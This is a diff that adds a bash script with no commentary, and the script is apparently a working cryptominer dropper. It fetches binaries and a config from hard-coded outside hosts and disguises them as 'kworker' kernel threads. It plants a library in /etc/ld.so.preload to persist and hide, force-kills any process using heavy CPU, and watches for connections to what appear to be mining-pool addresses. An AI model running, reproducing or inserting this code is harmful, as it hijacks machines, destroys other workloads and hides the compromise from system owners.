@@ -1,0 +1,206 @@
+#!/bin/bash
+DIR="/var/tmp"
+if [ -a "/var/tmp/kworkerdss" ]
+then
+    if [ -w "/var/tmp/kworkerdss" ] && [ ! -d "/var/tmp/kworkerdss" ]
+    then
+        if [ -x "$(command -v md5sum)" ]
+        then
+            sum=$(md5sum /var/tmp/kworkerdss | awk '{ print $1 }')
+            echo $sum
+            case $sum in
+                a5c7c93fa57c1fc27cde28b047c85be6 | a5c7c93fa57c1fc27cde28b047c85be6)
+                    echo "kworkerdss OK"
+                ;;
+                *)
+                    echo "kworkerdss wrong"
+                    rm -rf /usr/local/lib/libkk.so
+                    echo "" > /etc/ld.so.preload
+                    pkill -f xdd.conf
+                    pkill -f kworkerdss
+                    sleep 4
+                ;;
+            esac
+        fi
+        echo "P OK"
+    else
+        DIR=$(mktemp -d)/var/tmp
+        mkdir $DIR
+        echo "T DIR $DIR"
+    fi
+else
+    if [ -d "/var/tmp" ]
+    then
+        DIR="/var/tmp"
+    fi
+    echo "P NOT EXISTS"
+fi
+if [ -d "/var/tmp/kworkerdss" ]
+then
+    DIR=$(mktemp -d)/var/tmp
+    mkdir $DIR
+    echo "T DIR $DIR"
+fi
+WGET="wget -O"
+if [ -s /usr/bin/curl ];
+then
+    WGET="curl -o";
+fi
+if [ -s /usr/bin/wget ];
+then
+    WGET="wget -O";
+fi
+f2="37.44.212.223"
+
+downloadIfNeed()
+{
+    if [ -x "$(command -v md5sum)" ]
+    then
+        if [ ! -f $DIR/kworkerdss ]; then
+            echo "File not found!"
+            download
+        fi
+        sum=$(md5sum $DIR/kworkerdss | awk '{ print $1 }')
+        echo $sum
+        case $sum in
+            a5c7c93fa57c1fc27cde28b047c85be6 | a5c7c93fa57c1fc27cde28b047c85be6)
+                echo "kworkerdss OK"
+            ;;
+            *)
+                echo "kworkerdss wrong"
+                sizeBefore=$(du $DIR/kworkerdss)
+                if [ -s /usr/bin/curl ];
+                then
+                    WGET="curl -k -o ";
+                fi
+                if [ -s /usr/bin/url ];
+                then
+                    WGET="url -k -o ";
+                fi
+                if [ -s /usr/bin/wget ];
+                then
+                    WGET="wget --no-check-certificate -O ";
+                fi
+                if [ -s /usr/bin/get ];
+                then
+                    WGET="get --no-check-certificate -O ";
+                fi
+                download
+                sumAfter=$(md5sum $DIR/kworkerdss | awk '{ print $1 }')
+                if [ -s /usr/bin/curl ];
+                then
+                    echo "redownloaded $sum $sizeBefore after $sumAfter " `du $DIR/kworkerdss` > $DIR/var/tmp.txt
+                fi
+            ;;
+        esac
+    else
+        echo "No md5sum"
+        download
+    fi
+}
+
+download() {
+    if [ -x "$(command -v md5sum)" ]
+    then
+        sum=$(md5sum $DIR/kworkerdss3 | awk '{ print $1 }')
+        echo $sum
+        case $sum in
+            a5c7c93fa57c1fc27cde28b047c85be6 | a5c7c93fa57c1fc27cde28b047c85be6)
+                echo "kworkerdss OK"
+                cp $DIR/kworkerdss3 $DIR/kworkerdss
+				        cp $DIR/kworkerdss3 $DIR/kworkerdss
+            ;;
+            *)
+                echo "kworkerdss wrong"
+                download2
+            ;;
+        esac
+    else
+        echo "No md5sum"
+        download2
+    fi
+}
+
+download2() {
+    if [ `getconf LONG_BIT` = "64" ]
+    then
+    echo "" > /etc/ld.so.preload
+    $WGET $DIR/kworkerdss http://37.44.212.223/x
+    $WGET $DIR/xdd.conf http://www.jukesxdbrxd.xyz/wt.conf
+    rm -rf /usr/local/lib/libkk.so
+    cp /var/tmp/1.so /usr/local/lib/libkk.so
+    echo "/usr/local/lib/libkk.so" > /etc/ld.so.preload
+    else
+    echo "" > /etc/ld.so.preload
+    $WGET $DIR/kworkerds32 http://37.44.212.223/xx
+    $WGET $DIR/xdd.conf http://www.jukesxdbrxd.xyz/wt.conf
+    rm -rf /usr/local/lib/libkk.so
+    cp /var/tmp/1.so /usr/local/lib/libkk.so
+    echo "/usr/local/lib/libkk.so" > /etc/ld.so.preload
+    fi
+    if [ -x "$(command -v md5sum)" ]
+    then
+        sum=$(md5sum $DIR/kworkerdss | awk '{ print $1 }')
+        echo $sum
+        case $sum in
+            a5c7c93fa57c1fc27cde28b047c85be6 | a5c7c93fa57c1fc27cde28b047c85be6)
+                echo "kworkerdss OK"
+                cp $DIR/kworkerdss $DIR/kworkerdss3
+            ;;
+            *)
+                echo "kworkerdss wrong"
+            ;;
+        esac
+    else
+        echo "No md5sum"
+    fi
+}
+
+judge() {
+    if [ ! "$(netstat -ant|grep '54.36.137.146:5790\|37.59.162.30:5790'|grep 'ESTABLISHED'|grep -v grep)" ];
+    then
+        ps axf -o "pid %cpu" | awk '{if($2>=30.0) print $1}' | while read procid
+	      do
+	      kill -9 $procid
+        done
+        downloadIfNeed
+        rm -rf /usr/local/lib/libkk.so
+		    $WGET $DIR/kworkerdss http://37.44.212.223/x
+                    $WGET $DIR/kworkerds32 http://37.44.212.223/xx
+        $WGET $DIR/xdd.conf http://www.jukesxdbrxd.xyz/wt.conf
+		    cp $DIR/1.so /usr/local/lib/libkk.so
+        touch /etc/ld.so.preload
+        echo "" > /etc/ld.so.preload
+        echo "/usr/local/lib/libkk.so" > /etc/ld.so.preload
+        pkill -f /var/tmp/java
+        pkill -f wc.conf
+        chmod +x $DIR/kworkerdss
+        chmod +x $DIR/kworkerds32
+	nohup $DIR/kworkerdss -c $DIR/xdd.conf > /dev/null 2>&1 &
+        nohup $DIR/kworkerds32 -c $DIR/xdd.conf > /dev/null 2>&1 &
+        sleep 5
+    else
+       echo "Running"
+    fi
+}
+
+judge2() {
+    if [ ! "$(ps -fe|grep 'kworkerdss\|kworkerds32'|grep 'xdd.conf'|grep -v grep)" ];
+    then
+        downloadIfNeed
+        chmod +x $DIR/kworkerdss
+        chmod +x $DIR/kworkerds32
+	nohup $DIR/kworkerdss -c $DIR/xdd.conf > /dev/null 2>&1 &
+        nohup $DIR/kworkerds32 -c $DIR/xdd.conf > /dev/null 2>&1 &
+        sleep 5
+    else
+        echo "Running"
+    fi
+}
+
+if [ ! "$(netstat -ant|grep 'LISTEN\|ESTABLISHED\|TIME_WAIT'|grep -v grep)" ];
+then
+    judge2
+else
+    judge
+fi
